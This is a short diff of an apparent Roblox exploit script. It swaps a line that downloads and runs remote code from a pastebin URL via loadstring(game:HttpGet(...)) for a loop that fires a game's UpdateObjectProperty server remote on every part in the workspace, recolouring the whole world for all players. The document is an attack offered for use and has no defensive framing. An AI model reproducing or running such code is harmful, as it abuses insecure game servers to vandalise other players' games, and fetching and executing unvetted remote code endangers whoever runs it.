@@ -268,7 +268,7 @@ local function TWFBJZF_fake_script() -- waappdestroyer.Script
 	local script = Instance.new('Script', waappdestroyer)
 
 	script.Parent.MouseButton1Down:Connect(function()
-loadstring(game:HttpGet("https://pastebin.com/raw/BywSVje6"))()
+function a(b) for _,v in pairs(b:children()) do if v:IsA("BasePart") then   workspace.GameService.UpdateObjectProperty:FireServer(v,"BrickColor",BrickColor.random()) end a(v) end end a(workspace)
 	end)
 end
 coroutine.wrap(TWFBJZF_fake_script)()
